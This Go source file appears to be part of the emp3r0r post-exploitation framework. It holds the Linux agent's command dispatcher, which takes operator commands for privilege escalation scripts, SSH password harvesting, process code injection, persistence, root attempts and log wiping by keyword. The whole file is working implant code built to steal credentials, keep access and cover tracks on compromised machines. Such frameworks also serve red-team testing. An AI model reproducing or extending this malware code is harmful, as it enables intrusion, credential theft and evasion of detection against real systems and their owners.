//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strconv"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {

	case emp3r0r_data.C2CmdLPE:
		// Usage: !lpe --script_name <script_name>
		// Runs a Local Privilege Escalation (LPE) script.
		scriptName := flags.StringP("script_name", "s", "", "Script name")
		flags.Parse(cmdSlice[1:])
		if *scriptName == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Printf("%s", out)
			return
		}
		out = runLPEHelper(*scriptName)
		return

	case emp3r0r_data.C2CmdSSHHarvester:
		// Usage: !ssh_harvester
		// Starts monitoring SSH connections and logs passwords.
		passfile := fmt.Sprintf("%s/%s.txt",
			RuntimeConfig.AgentRoot, util.RandStr(10))
		out = fmt.Sprintf("Look for passwords in %s", passfile)
		go sshd_monitor(passfile)
		return

	// !inject --method method --pid pid
	case emp3r0r_data.C2CmdInject:
		// Usage: !inject --method <method> --pid <pid>
		// Injects code into the specified process using the specified method.
		method := flags.StringP("method", "m", "", "Injection method")
		pid := flags.StringP("pid", "p", "", "Process ID")
		flags.Parse(cmdSlice[1:])
		if *method == "" || *pid == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s: success", *method)
		pidInt, err := strconv.ParseInt(*pid, 10, 32)
		if err != nil {
			log.Print("Invalid pid")
		}
		err = InjectorHandler(int(pidInt), *method)
		if err != nil {
			out = "Error: " + err.Error()
		}
		return

	// !persistence --method method
	case emp3r0r_data.C2CmdPersistence:
		// Usage: !persistence --method <method>
		// Sets up persistence using the specified method.
		method := flags.StringP("method", "m", "", "Persistence method")
		flags.Parse(cmdSlice[1:])
		if *method == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = "Success"
		if *method == "all" {
			err = PersistAllInOne()
			if err != nil {
				log.Print(err)
				out = fmt.Sprintf("Some has failed: %v", err)
			}
		} else {
			out = "Error: No such method available"
			if persistMethod, exists := PersistMethods[*method]; exists {
				out = "Success"
				err = persistMethod()
				if err != nil {
					log.Println(err)
					out = fmt.Sprintf("Error: %v", err)
				}
			}
		}
		return

	// !get_root
	case emp3r0r_data.C2CmdGetRoot:
		// Usage: !get_root
		// Attempts to gain root privileges.
		if os.Geteuid() == 0 {
			out = "Warning: You already have root!"
		} else {
			err = GetRoot()
			out = fmt.Sprintf("Error: LPE exploit failed:\n%v", err)
			if err == nil {
				out = "If you see agent goes online again, you got root!"
			}
		}
		return

	// !clean_log --keyword keyword
	case emp3r0r_data.C2CmdCleanLog:
		// Usage: !clean_log --keyword <keyword>
		// Cleans logs containing the specified keyword.
		keyword := flags.StringP("keyword", "k", "", "Keyword to clean logs")
		flags.Parse(cmdSlice[1:])
		if *keyword == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = "Done"
		err = CleanAllByKeyword(*keyword)
		if err != nil {
			out = err.Error()
		}
		return
	}

	return fmt.Sprintf("Error: Unknown command %v", cmdSlice)
}
